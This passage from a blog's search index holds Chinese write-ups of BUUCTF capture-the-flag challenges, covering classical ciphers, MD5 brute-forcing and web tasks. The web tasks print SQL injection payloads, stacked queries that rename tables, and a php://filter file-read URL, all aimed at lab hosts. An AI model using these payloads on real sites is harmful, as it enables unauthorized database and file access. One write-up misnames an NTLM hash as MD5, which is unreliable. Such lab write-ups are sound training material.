print(ord(s1[i])-ord(s2[i]),end=\" \")\n    i+=1\n```\n输出的结果：\n```text\n77 84 72 74 123 67 85 66 67 71 88 71 85 71 88 87 82 69 88 73 80 79 89 65 79 69 89 70 73 71 88 87 82 88 67 72 84 75 72 70 67 79 72 67 70 68 85 67 71 84 88 90 79 72 73 88 79 69 79 87 77 69 72 90 79 125 \n\n\n102 108 97 103 123 115 117 98 115 116 105 116 117 116 105 111 110 99 105 112 104 101 114 100 101 99 114 121 112 116 105 111 110 105 115 97 108 119 97 121 115 101 97 115 121 106 117 115 116 108 105 107 101 97 112 105 101 99 101 111 102 99 97 107 101 125 \n\n\n-25 -24 -25 -29 0 -48 -32 -32 -48 -45 -17 -45 -32 -45 -17 -24 -28 -30 -17 -39 -24 -22 -25 -35 -22 -30 -25 -51 -39 -45 -17 -24 -28 -17 -48 -25 -24 -44 -25 -51 -48 -22 -25 -48 -51 -38 -32 -48 -45 -24 -17 -17 -22 -25 -39 -17 -22 -30 -22 -24 -25 -30 -25 -17 -22 0 \n```\n或者用这套脚本分析起来也不错：\n```python\ns1=\"MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}\"\ns2=\"flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake}\"\ni:int=0\nwhile i<len(s1):\n    print(\"s1=\"+s1[i]+\"-->\"+str(ord(s1[i]))+\"  s2=\"+s2[i]+\"-->\"+str(ord(s2[i]))+\"   move=\"+str(ord(s1[i])-ord(s2[i])))\n    i+=1\n```\n","categories":["Crypto","凯撒密码","词频分析"]},{"title":"变异凯撒","url":"/2021/08/26/变异凯撒/","content":"[题目链接](https://buuoj.cn/challenges#变异凯撒)\n<!-- more -->\n附件下载解压，得到密文：\n```text\nafZ_r9VYfScOeO_UL^RWUc\n```\n结合题目，用前四位字符与“flag”做一下对比：\n```\n加密密文：a  f   Z  _\n        97 102 90 95\n格式：flag{ }\n       102 108 97 103\n偏移量：  5  6   7  8\n```\n因此用python写一个脚本计算：\n```python\ns1=\"afZ_r9VYfScOeO_UL^RWUc\"\ns2:str=\"\"\ni:int=0\nwhile i<len(s1):\n\ts2+=chr(ord(s1[i])+5+i)\n \ti+=1\nprint(s2)\n```\nflag:~~flag{Caesar_variation}~~\n\n","categories":["Crypto","凯撒密码"]},{"title":"权限获得第一步","url":"/2021/08/26/权限获得第一步/","content":"[题目链接](https://buuoj.cn/challenges#%E6%9D%83%E9%99%90%E8%8E%B7%E5%BE%97%E7%AC%AC%E4%B8%80%E6%AD%A5)\n<!-- more -->\n附件下载，得到密文：\n```text\nAdministrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::\n```\n看结构应该是MD5加密过的账号密码，用[CMD5](https://cmd5.com/)搜一下后面那串字符的原文就可以得到flag。\nflag:~~flag{3617656}~~\n\n","categories":["Crypto","MD5"]},{"title":"强网杯 2019-随便注","url":"/2021/08/26/强网杯 2019-随便注/","content":"[题目链接](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81\n```\n尝试一下1，看看返回：\n```text\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1\n```\n![](/images/Writeup/20210826100616.png)\n用字符类注入试试：\n```text\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1'or'1'='1\n```\n![](/images/Writeup/20210826100954.png)\n看来可以用字符类注入，看看SQL语句，让它返回一下数据库：\n```text\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1%27;show%20databases;\n```\n![](/images/Writeup/20210826101322.png)\n再看一下数据表名字：\n```\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1%27;show%20tables;\n```\n![](/images/Writeup/20210826101401.png)\n```text\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1';select columns from `1919810931114514`;\n```\n![](/images/Writeup/20210826101522.png)\n```sql\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n看来是加了字符过滤。。用show看看：\n```text\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1';show columns from `1919810931114514`;\n```\n![](/images/Writeup/20210826102007.png)\n```text\nhttp://8ddd8c57-b300-4ec8-9e1a-7a8604b29842.node4.buuoj.cn:81/?inject=1%27;show columns from `words`;\n```\n![](/images/Writeup/20210826102058.png)\n于是想修改表名，让flag的数据改到word里面：\n```sql\n-1';\nrename table `words` to `test`;\nrename table `1919810931114514` to `words`;\nalter table `words` change `flag` `id` varchar(100);\nshow columns from words;--+\n# ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);\n```\n然后再用or访问一下，得到flag：\n```text\nhttp://d90a73f5-4781-43fb-8f2b-843befb62ce2.node4.buuoj.cn:81/?inject=1%27or%271%27=%271\n```\n![](/images/Writeup/20210826103915.png)\nflag:~~flag{58137d8f-17a7-45e9-9133-ed00429b6339}~~\n\n\n\n\n---\n参考了：[[强网杯 2019]随便注 By chalan630](https://www.cnblogs.com/chalan630/p/12583667.html)](https://www.cnblogs.com/chalan630/p/12583667.html)\n#Web #Web/SQL注入 \n2021-08-26\n","categories":["Web","SQL注入"]},{"title":"极客大挑战 2019-EasySQL","url":"/2021/08/26/极客大挑战 2019-EasySQL/","content":"[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://9d7ea079-7d1f-4c38-802f-e20efeb7424f.node4.buuoj.cn:81\n```\n![](/images/Writeup/20210826094307.png)\n随便输点数据看看返回值：\n```text\nhttp://9d7ea079-7d1f-4c38-802f-e20efeb7424f.node4.buuoj.cn:81/check.php?username=admin&password=admin\n```\n![](/images/Writeup/20210826094352.png)\n看来是字符类注入，用or注入一下：\n```text\nhttp://9d7ea079-7d1f-4c38-802f-e20efeb7424f.node4.buuoj.cn:81/check.php?username=admin&password=admin'or'1'='1\n```\n得到数据：\n![](/images/Writeup/20210826094529.png)\nflag:~~flag{1db0b1ee-420f-4f19-a3df-acf5c1cd3aea}~~\n\n---\n#Web #Web/SQL注入 \n2021-08-26\n","categories":["Web","SQL注入"]},{"title":"极客大挑战 2019-Havefun","url":"/2021/08/26/极客大挑战 2019-Havefun/","content":"[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://82432cd5-98a0-49ea-bc10-aee610ef8150.node4.buuoj.cn:81\n```\n进入网页，<kbd>F12</kbd>看一下源代码，发现一段信息：\n```html\n<!--\n        $cat=$_GET['cat'];\n        echo $cat;\n        if($cat=='dog'){\n            echo 'Syc{cat_cat_cat_cat}';\n        }\n        -->\n```\n那就尝试传入cat=dog来看一下返回：\n```text\nhttp://82432cd5-98a0-49ea-bc10-aee610ef8150.node4.buuoj.cn:81/index.php?cat=dog\n```\n就得到了flag：\n![](/images/Writeup/20210826100031.png)\nflag:~~flag{d6769dd5-bacd-48b7-bb27-611ded6ed5e9}~~\n","categories":["Web"]},{"title":"看我回旋踢","url":"/2021/08/26/看我回旋踢/","content":"[题目链接](https://buuoj.cn/challenges#%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2)\n<!-- more -->\n附件下载，得到密文：\n```text\nsynt{5pq1004q-86n5-46q8-o720-oro5on0417r1}\n```\n看题目说回旋踢，莫非，是rot13类加密？\n写个脚本（仅小写字符）测试一下：\n```python\ns1=\"synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}\"\ns2:str=\"\"\nfor i in range(1,26):\n    s2=\"\"\n    for letter in s1:\n        if ord(letter)>=97 and ord(letter)<=122 :\n            v1=ord(letter)+i\n            if v1>122:\n                s2+=chr(97+v1-123)\n            else:\n                s2+=chr(v1)\n        else:\n            s2+=letter\n    print(s2)\n    i+=1\n```\n输出结果：\n```text\ntzou{5qr1004r-86o5-46r8-p720-psp5po0417s1}\nuapv{5rs1004s-86p5-46s8-q720-qtq5qp0417t1}\nvbqw{5st1004t-86q5-46t8-r720-rur5rq0417u1}\nwcrx{5tu1004u-86r5-46u8-s720-svs5sr0417v1}\nxdsy{5uv1004v-86s5-46v8-t720-twt5ts0417w1}\nyetz{5vw1004w-86t5-46w8-u720-uxu5ut0417x1}\nzfua{5wx1004x-86u5-46x8-v720-vyv5vu0417y1}\nagvb{5xy1004y-86v5-46y8-w720-wzw5wv0417z1}\nbhwc{5yz1004z-86w5-46z8-x720-xax5xw0417a1}\ncixd{5za1004a-86x5-46a8-y720-yby5yx0417b1}\ndjye{5ab1004b-86y5-46b8-z720-zcz5zy0417c1}\nekzf{5bc1004c-86z5-46c8-a720-ada5az0417d1}\nflag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}\ngmbh{5de1004e-86b5-46e8-c720-cfc5cb0417f1}\nhnci{5ef1004f-86c5-46f8-d720-dgd5dc0417g1}\niodj{5fg1004g-86d5-46g8-e720-ehe5ed0417h1}\njpek{5gh1004h-86e5-46h8-f720-fif5fe0417i1}\nkqfl{5hi1004i-86f5-46i8-g720-gjg5gf0417j1}\nlrgm{5ij1004j-86g5-46j8-h720-hkh5hg0417k1}\nmshn{5jk1004k-86h5-46k8-i720-ili5ih0417l1}\nntio{5kl1004l-86i5-46l8-j720-jmj5ji0417m1}\noujp{5lm1004m-86j5-46m8-k720-knk5kj0417n1}\npvkq{5mn1004n-86k5-46n8-l720-lol5lk0417o1}\nqwlr{5no1004o-86l5-46o8-m720-mpm5ml0417p1}\nrxms{5op1004p-86m5-46p8-n720-nqn5nm0417q1}\n```\nflag:~~flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}~~\n","categories":["Crypto","rot13"]},{"title":"篱笆墙的影子","url":"/2021/08/26/篱笆墙的影子/","content":"[题目链接](https://buuoj.cn/challenges#篱笆墙的影子)\n<!-- more -->\n密文是：\n```text\nfelhaagv{ewtehtehfilnakgw}\n```\n看一下其中的规律，发现flag中间隔了几个字符，用python分开看一下：\n```python\ns1=\"felhaagv{ewtehtehfilnakgw}\"\ni:int=0\ns2:str=\"\"\ns3:str=\"\"\nwhile i<len(s1):\n\t if i%2==0:\n\t s2+=s1[i]\n\t else:\n\t s3+=s1[i]\n\t i+=1\nprint(s2+s3)\n```\nflag:~~flag{wethinkwehavetheflag}~~\n","categories":["Crypto","凯撒密码"]},{"title":"极客大挑战 2019-Secret File","url":"/2021/08/26/极客大挑战 2019-Secret File/","content":"[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://3b5a73fb-98c6-46fc-9dbd-a34cea4b46af.node4.buuoj.cn:81/\n```\n打开来可以看见：\n![](/images/Writeup/20210826104355.png)\nF12看一下源代码，找到隐藏链接：\n![](/images/Writeup/20210826104444.png)\n进入之后，看到的是这个页面，顺着按钮点击，却告知我们已经错过了flag：\n![](/images/Writeup/20210826104535.png)\n![](/images/Writeup/20210826104542.png)\n于是想到用[[Burp Suite)看一下网络包：\n![](/images/Writeup/20210826104750.png)\n看到了另一个隐藏页面：secr3t.php，访问一下试试：\n![](/images/Writeup/20210826104842.png)\n又指向到了flag.php这个页面：\n![](/images/Writeup/20210826105023.png)\n于是回头想到secr3t.php这个页面，有文件读取漏洞：\n```text\nhttp://00b5c733-809a-4aed-a498-27d306b09452.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php\n```\n得到了flag的Base64的值：\n```text\nPCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7OTIwOTFjYmYtYjYxYS00YTI2LWFmYmItNDRiYjY1M2E1M2U1fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=\n```\n解密之后得到了flag.php的代码：\n```html\n<!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"utf-8\">\n        <title>FLAG</title>\n    </head>\n\n    <body style=\"background-color:black;\"><br><br><br><br><br><br>\n        \n        <h1 style=\"font-family:verdana;color:red;text-align:center;\">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>\n        \n        <p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\">\n            <?php\n                echo \"我就在这里\";\n                $flag = 'flag{92091cbf-b61a-4a26-afbb-44bb653a53e5}';\n                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'\n            ?>\n        </p>\n    </body>\n\n</html>\n```\nflag:~~flag{92091cbf-b61a-4a26-afbb-44bb653a53e5}~~\n\n","categories":["Web","SQL注入"]},{"title":"萌萌哒的八戒","url":"/2021/08/26/萌萌哒的八戒/","content":"[题目链接](https://buuoj.cn/challenges#%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E5%85%AB%E6%88%92)\n<!-- more -->\n附件下载，得到密文：\n![[Pasted image 20210828070325.png]]\n二话不说，直接百度，得到猪圈密码：\n![](https://img-blog.csdnimg.cn/20200212103433425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQwNDMxNA==,size_16,color_FFFFFF,t_70)\nflag:~~flag{whenthepigwanttoeat}~~\n\n","categories":["Crypto"]},{"title":"还原大师","url":"/2021/08/26/还原大师/","content":"[题目链接](https://buuoj.cn/challenges#%E8%BF%98%E5%8E%9F%E5%A4%A7%E5%B8%88)\n<!-- more -->\n密文：\n```text\nE903???4DAB????08?????51?80??8A?\n```\n明文:\n```text\nTASC?O3RJMV?WDJKX?ZM\n```\n考虑用脚本做一下碰撞:\n```python\nimport hashlib\ns1=['TASC','O3RJMV','WDJKX','ZM']\na:int=65\nb:int=65\nc:int=65\nwhile a<=90:\n    while b<=90:\n        while c<=90:\n            m = hashlib.md5()\n            m.update((s1[0]+chr(a)+s1[1]+chr(b)+s1[2]+chr(c)+s1[3]).encode(\"utf-8\"))\n            s=m.hexdigest()\n            if s[0:3]=='E903':\n                print(s+\"     XD\")\n            else:\n                pass\n                # print(s)\n            c+=1\n        b+=1\n        c=65\n    a+=1\n    b=65\n    c=65\n```\n好像哪里写错了。。借用网上大佬的脚本：\n```python\n# -*- coding: utf-8 -*-\n#!/usr/bin/env python\nimport hashlib\n\n#print hashlib.md5(s).hexdigest().upper()\nk = 'TASC?O3RJMV?WDJKX?ZM'                    #要还原的明文\nfor i in range(26):\n\ttemp1 = k.replace('?',str(chr(65+i)),1)\n\tfor j in range(26):\n\t\ttemp2 = temp1.replace('?',chr(65+j),1)\n\t\tfor n in range(26):\n\t\t\ttemp3 = temp2.replace('?',chr(65+n),1)\n\t\t\ts = hashlib.md5(temp3.encode('utf8')).hexdigest().upper()#注意大小写\n\t\t\tif s[:4] == 'E903':    #检查元素\n\t\t\t\tprint (s)       #输出密文\n\n# ————————————————\n# 版权声明：本文为CSDN博主「宁嘉」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上# 原文出处链接及本声明。\n# 原文链接：https://blog.csdn.net/MikeCoke/article/details/106118054\n```\nflag:~~flag{E9032994DABAC08080091151380478A2}~~\n\n","categories":["Crypto","MD5"]}]